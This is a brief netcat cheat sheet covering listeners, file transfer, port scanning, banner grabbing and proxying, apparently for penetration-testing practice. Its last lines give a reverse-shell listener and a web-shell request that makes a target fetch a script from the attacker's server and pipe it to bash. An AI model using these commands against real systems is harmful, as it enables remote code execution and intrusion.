# `nc` (Netcat)

Netcat is a versatile networking utility that is used for reading from and writing to network connections using TCP or UDP protocols

### To listen on a specific port
nc -l -p <port>

### To connect to a server on a specific host and port
nc <host> <port>

File Transfer:

Netcat can be used to transfer files between systems.
bash

### On the receiving end
nc -l -p <port> > received_file

### On the sending end
nc <host> <port> < file_to_send


Port Scanning:

Netcat can be used for basic port scanning to check the status of ports on a remote server.
bash

nc -zv <host> <start_port>-<end_port>
Banner Grabbing:

Netcat can be used to grab banners or information from network services.
bash

nc -v <host> <port>

Chat Server and Client:

Netcat can facilitate simple chat communication between systems.
bash

### On the server
nc -l -p <port>

### On the client
nc <host> <port>

Proxying:

Netcat can act as a basic proxy to forward traffic between two hosts.
bash

### On the proxy server
nc -l -p <local_port> | nc <remote_host> <remote_port>

### On the client
nc -N <proxy_host> <proxy_port>

### Listen for resverse shell
nc -nvlp 1337

Launch a web server on your machine and visit the URL:
python3 -m http.server 8000
<hostname>/shell.php?cmd=curl%20<IP_ADDRESS>:8000/shell.sh|bash
